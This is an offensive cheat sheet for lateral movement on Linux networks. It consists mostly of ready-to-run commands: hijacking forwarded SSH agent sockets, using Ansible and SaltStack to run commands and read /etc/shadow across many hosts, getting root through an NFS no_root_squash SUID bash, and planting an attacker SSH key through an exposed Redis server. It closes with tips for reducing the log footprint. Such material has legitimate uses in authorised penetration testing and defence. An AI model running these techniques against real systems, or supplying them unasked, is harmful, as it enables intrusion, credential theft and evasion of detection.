# Linux Lateral Movement Reference

## SSH — Primary Linux Lateral Movement

### Password Authentication
```
# Direct SSH with password
ssh user@<TARGET>

# Automated (non-interactive)
sshpass -p 'password' ssh user@<TARGET>
sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@<TARGET>

# With specific port
ssh -p 2222 user@<TARGET>
```

### Key-Based Authentication
```
# Using specific private key
ssh -i /path/to/id_rsa user@<TARGET>
ssh -i /path/to/id_ed25519 user@<TARGET>

# Key with passphrase — use ssh-agent
eval $(ssh-agent)
ssh-add /path/to/id_rsa    # Enter passphrase once
ssh user@<TARGET>           # No passphrase prompt

# Test if key works without connecting
ssh -o BatchMode=yes -o ConnectTimeout=5 user@<TARGET> 'echo ok'
```

### SSH ProxyJump (Multi-Hop)
```
# Single jump
ssh -J user@jumphost user@<TARGET>

# Multiple jumps
ssh -J user@jump1,user@jump2 user@<TARGET>

# ~/.ssh/config equivalent
Host internal-target
    HostName 10.10.10.5
    User admin
    ProxyJump user@jumphost

Host jumphost
    HostName 192.168.1.100
    User jumpuser
    IdentityFile ~/.ssh/jump_key

# Then simply:
ssh internal-target
```

### SSH ProxyCommand (older method)
```
# Through SOCKS proxy
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<TARGET>

# Through HTTP proxy
ssh -o ProxyCommand='ncat --proxy-type http --proxy proxy.corp:8080 %h %p' user@<TARGET>

# Through another SSH connection
ssh -o ProxyCommand='ssh -W %h:%p user@jumphost' user@<TARGET>
```

### SSH Agent Forwarding
```
# Forward your local SSH agent to remote host
ssh -A user@jumphost

# From jumphost, use forwarded keys
ssh user@<TARGET>    # Uses keys from your local agent

# Verify agent is available
echo $SSH_AUTH_SOCK
ssh-add -l

# DANGER: Agent hijacking
# If attacker has root on jumphost, they can use your forwarded agent:
# Find agent socket
find /tmp -name "agent.*" -type s 2>/dev/null
# Hijack it
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.<PID>
ssh-add -l    # See victim's keys
ssh user@anywhere    # Authenticate as victim
```

### SSH Multiplexing (persistent connections)
```
# ~/.ssh/config
Host *
    ControlMaster auto
    ControlPath /tmp/ssh-%r@%h:%p
    ControlPersist 600

# First connection creates master
ssh user@<TARGET>

# Subsequent connections reuse (instant, no re-auth)
ssh user@<TARGET>
```

---

## Ansible (Configuration Management Abuse)

### Ad-Hoc Commands
```
# Execute command on remote host
ansible -i "<TARGET>," all -m shell -a "whoami" -u user --ask-pass
ansible -i "<TARGET>," all -m shell -a "id" -u user -k

# Multiple targets
ansible -i "host1,host2,host3," all -m shell -a "hostname" -u user -k

# With sudo
ansible -i "<TARGET>," all -m shell -a "cat /etc/shadow" -u user -k -b --ask-become-pass

# Copy file to target
ansible -i "<TARGET>," all -m copy -a "src=payload.sh dest=/tmp/payload.sh mode=0755" -u user -k
```

### Playbook Execution
```yaml
# lateral.yml
---
- hosts: targets
  become: yes
  tasks:
    - name: Execute command
      shell: whoami > /tmp/output.txt
    - name: Fetch results
      fetch:
        src: /tmp/output.txt
        dest: ./results/
```
```
ansible-playbook -i "host1,host2," lateral.yml -u user -k -K
```

### Existing Ansible Infrastructure
```
# If you find ansible on a compromised host:
cat /etc/ansible/hosts                    # Inventory — all managed hosts
find / -name "ansible.cfg" 2>/dev/null    # Config files
find / -name "*.yml" -path "*/ansible/*" 2>/dev/null
cat ~/.ansible/vault_password             # Vault password

# Reuse existing playbooks/inventory
ansible all -m shell -a "whoami"          # Uses default inventory
```

---

## SaltStack
```
# If salt-master is compromised:
salt '*' cmd.run 'whoami'                 # Execute on all minions
salt '*' cmd.run 'cat /etc/shadow'
salt -L 'host1,host2' cmd.run 'id'       # Specific minions

# List minions
salt-key -L
salt '*' grains.item os
```

---

## Other Linux Lateral Techniques

### Telnet/Rlogin (legacy systems)
```
telnet <TARGET> 23
rlogin -l user <TARGET>
# Check for .rhosts trust relationships
cat ~/.rhosts
cat /etc/hosts.equiv
```

### NFS Exploitation
```
# Find NFS shares
showmount -e <TARGET>

# Mount remote share
mkdir /tmp/nfs
mount -t nfs <TARGET>:/share /tmp/nfs

# If no_root_squash is set → root on your box = root on NFS
# Create SUID binary or edit files as root
cp /bin/bash /tmp/nfs/bash
chmod u+s /tmp/nfs/bash
# On target: /share/bash -p → root shell
```

### Redis (if exposed)
```
# Write SSH key via Redis
redis-cli -h <TARGET>
> config set dir /root/.ssh
> config set dbfilename authorized_keys
> set payload "\n\nssh-rsa AAAA... attacker@host\n\n"
> save
> quit
ssh root@<TARGET>
```

---

## OPSEC Notes
- SSH logins generate auth.log entries (syslog facility auth)
- Agent forwarding is dangerous — compromised jumphost can hijack keys
- ProxyJump is safer than agent forwarding for multi-hop
- Ansible generates logs on both controller and target
- NFS no_root_squash is a critical misconfiguration — always check
- SSH multiplexing reduces authentication events in logs
- Use `-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no` to avoid known_hosts footprint
